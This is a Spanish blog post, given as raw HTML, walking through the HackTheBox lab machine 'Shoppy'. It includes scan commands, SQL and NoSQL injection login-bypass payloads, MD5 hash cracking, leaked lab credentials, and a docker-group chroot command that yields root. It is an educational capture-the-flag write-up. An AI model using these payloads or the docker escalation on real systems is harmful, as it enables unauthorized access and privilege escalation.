      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/favicons/pito.ico" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">H4ckerLite</a>
    </div>
    <div class="site-subtitle font-italic">programación, ciberseguridad, hacking, writeups y mas.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORÍAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/H4ckerLite" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/mortzelo" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>Shoppy WriteUp</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>Shoppy WriteUp</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1673625600"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-01-13
</em>

    </span>

    <!-- lastmod date -->
    
    <span>
      Actualizado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1673911281"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-01-16
</em>

    </span>
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="../../assets/img/commons/shoppy-writeup/Shoppy.png" class="preview-img bg"
        alt="Shoppy WriteUp"

      

       data-proofer-ignore>

      
        <figcaption class="text-center pt-2 pb-2">Shoppy WriteUp</figcaption>
      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
        H4ckerLite
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1189 palabras">
  <em>6 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Les explicaré comó comprometer la máquina <a href="https://app.hackthebox.com/machines/496">Shoppy</a> de HackTheBox. En esta máquina nos enfretaremos a un <code class="language-plaintext highlighter-rouge">NoSQLi</code> de <code class="language-plaintext highlighter-rouge">MongoDB</code> y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo <strong>Docker</strong>.</p>

<h2 id="escaneo-nmap"><span class="mr-2">Escaneo NMAP</span><a href="#escaneo-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.180 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-15 11:59 <span class="nt">-04</span>
Initiating SYN Stealth Scan at 11:59
Scanning 10.10.11.180 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.11.180
Discovered open port 22/tcp on 10.10.11.180
Discovered open port 9093/tcp on 10.10.11.180
Completed SYN Stealth Scan at 12:00, 15.14s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.180
Host is up, received user-set <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2023-01-15 11:59:53 <span class="nt">-04</span> <span class="k">for </span>16s
Not shown: 65368 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 164 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
9093/tcp open  copycat syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.33 seconds
           Raw packets sent: 74269 <span class="o">(</span>3.268MB<span class="o">)</span> | Rcvd: 73540 <span class="o">(</span>2.942MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Nos percatamos que tiene el <strong>SSH</strong> abierto y el puerto 80 que corresponde al <strong>HTTP</strong>, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.10.11.180       shoppy.htb"</span> | <span class="nb">tee</span> <span class="nt">-a</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<p>Ahora debemos ver una web con una cuenta regresiva, nada importante</p>

<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Enumerando directorios con <strong>WFUZZ</strong> nos encontramos lo siguiente.
<strong><em>Nota: Debes tener clonado el repositorio de</em></strong> <strong>SecList</strong></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 50 <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://shoppy.htb/FUZZ
Total requests: 220560

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                                                                                
<span class="o">=====================================================================</span>

000000053:   200        25 L     62 W       1074 Ch     <span class="s2">"login"</span>                                                                                                                
000000016:   301        10 L     16 W       179 Ch      <span class="s2">"images"</span>                                                                                                               
000000291:   301        10 L     16 W       179 Ch      <span class="s2">"assets"</span>                                                                                                               
000000259:   302        0 L      4 W        28 Ch       <span class="s2">"admin"</span>   
</pre></td></tr></tbody></table></code></div></div>
<p>Nos encontramos con <strong>/login</strong> , intentamos acceder pero esta protegido por un login, podemos probar con una injección <strong>SQL</strong> y ver si es vulnerable a este tipo de ataque.</p>

<p><img data-src="/assets/img/commons/shoppy-writeup/login.png" alt="Login Shoppy" class="center-image" data-proofer-ignore>
<em>Login Shoppy</em></p>

<p>Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.</p>

<p><img data-src="/assets/img/commons/shoppy-writeup/login3.png" alt="Login Shoppy" class="center-image" data-proofer-ignore>
<em>Login Shoppy</em>
Podemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="s1">'
'</span><span class="nt">--</span> -
<span class="s1">' or '</span>1<span class="s1">'='</span>1
<span class="s1">' or '</span>1<span class="s1">'='</span>1<span class="s1">'-- -
</span></pre></td></tr></tbody></table></code></div></div>
<p>Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son <strong>MongoDB</strong>, buscando payloads en <strong>Google</strong> encontramos estos blogs <a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">MongoDB SQL injection</a> y  este otro blog <a href="https://nullsweep.com/nosql-injection-cheatsheet/">No SQl injection</a>.</p>

<p>Podemos probar <code class="language-plaintext highlighter-rouge">admin'||'1==1</code> y poner cualquier contraseña:</p>

<p><img data-src="/assets/img/commons/shoppy-writeup/login1.png" alt="Login Shoppy" class="center-image" data-proofer-ignore>
<em>Bypass Login</em></p>

<p>Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.
<img data-src="/assets/img/commons/shoppy-writeup/login2.png" alt="Login Shoppy" class="center-image" data-proofer-ignore></p>

<p>Nos sale una opción para descargar un archivo <code class="language-plaintext highlighter-rouge">JSON</code>, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"admin:23c6877d9e2b564ef8b32c3a23de27b2"</span> <span class="o">&gt;</span> hashes
<span class="nb">echo</span> <span class="s2">"josh:6ebcea65320589ca4f2f1ce039975995"</span> <span class="o">&gt;&gt;</span> hashes
❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hashes <span class="nt">--format</span><span class="o">=</span>Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>8
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
remembermethisway <span class="o">(</span>josh<span class="o">)</span>
1g 0:00:00:02 DONE <span class="o">(</span>2023-01-15 12:44<span class="o">)</span> 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..<span class="k">*</span>7¡Vamos!
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed

</pre></td></tr></tbody></table></code></div></div>
<p>Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>❯ gobuster vhost  <span class="nt">-w</span> /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt <span class="nt">-u</span> http://shoppy.htb/ <span class="nt">-t</span> 200
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:          http://shoppy.htb/
<span class="o">[</span>+] Method:       GET
<span class="o">[</span>+] Threads:      200
<span class="o">[</span>+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
<span class="o">[</span>+] User Agent:   gobuster/3.1.0
<span class="o">[</span>+] Timeout:      10s
<span class="o">===============================================================</span>
2023/01/15 12:48:41 Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Found: mattermost.shoppy.htb <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3122]
Progress: 52985 / 100001 <span class="o">(</span>52.98%<span class="o">)</span>    
</pre></td></tr></tbody></table></code></div></div>

<p>Tenemos un subdominio, la misma historia lo añadimos en el <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>

<p>Al entrar en el web nos encontramos con esto
<img data-src="/assets/img/commons/shoppy-writeup/josh.png" alt="Login Shoppy" class="center-image" data-proofer-ignore>
<em>Login Mattermost</em></p>

<p>Viendo las conversaciones nos dan un usuario y sus credenciales para el <em>SSH</em>, nos conectamos.
<img data-src="/assets/img/commons/shoppy-writeup/matt.png" alt="Login Shoppy" class="center-image" data-proofer-ignore>
<em>Information leaked</em></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>❯ ssh jaeger@10.10.11.180
jaeger@10.10.11.180<span class="s1">'s password: Sh0ppyBest@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26
manpath: can'</span>t <span class="nb">set </span>the locale<span class="p">;</span> make sure <span class="nv">$LC_</span><span class="k">*</span> and <span class="nv">$LANG</span> are correct
jaeger@shoppy:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
jaeger@shoppy:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario <code class="language-plaintext highlighter-rouge">deploy</code> un ejecutable.</p>

<h2 id="enumeración-del-sistema"><span class="mr-2">Enumeración del sistema</span><a href="#enumeración-del-sistema" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>jaeger@shoppy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jaeger: Sh0ppyBest@pp!
Matching Defaults entries <span class="k">for </span>jaeger on shoppy:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User jaeger may run the following commands on shoppy:
    <span class="o">(</span>deploy<span class="o">)</span> /home/deploy/password-manager
jaeger@shoppy:~<span class="nv">$ </span>

</pre></td></tr></tbody></table></code></div></div>
<p>Intentamos ejecutar el comando</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>jaeger@shoppy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/passw<span class="k">*</span>
Welcome to Josh password manager!
Please enter your master password: Password
Access denied! This incident will be reported <span class="o">!</span>
jaeger@shoppy:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>La contraseña no es correcta, jugando con <code class="language-plaintext highlighter-rouge">XXD</code> podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy</p>

<p><img data-src="/assets/img/commons/shoppy-writeup/xxd.png" alt="Login Shoppy" class="center-image" data-proofer-ignore>
<em>Password-Manager</em></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>jaeger@shoppy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds <span class="o">!</span>
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Podemos migrar al usuario <em>Deploy</em> .</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>jaeger@shoppy:~<span class="nv">$ </span>su deploy
Password: Deploying@pp!
<span class="nv">$ </span>bash
deploy@shoppy:/home/jaeger<span class="nv">$ </span>
deploy@shoppy:/home/jaeger<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
deploy@shoppy:/home/jaeger<span class="nv">$ </span>

</pre></td></tr></tbody></table></code></div></div>

<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Pertenecemos al grupo <code class="language-plaintext highlighter-rouge">docker</code>  mirando <a href="https://gtfobins.github.io/gtfobins/docker/#shell">GtfObins</a> podemos ver que podemos abusar del grupo <strong>docker</strong>
Ejecutamos el comando nos da una shell como root.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre> deploy@shoppy:/home/jaeger<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt bash
root@3ea87a82734f:/# 
</pre></td></tr></tbody></table></code></div></div>
<p>Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>root@3ea87a82734f:~# <span class="nb">cat </span>root.txt 
3d4c1a0477<span class="k">********************</span>66
root@3ea87a82734f:~# <span class="nb">cat</span> /home/jaeger/user.txt 
3d97fe0060<span class="k">********************</span>67
root@3ea87a82734f:~# 
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>hackthebox</a>,
      <a href='/categories/machine/'>machine</a>,
      <a href='/categories/writeup/'>writeup</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a>
      
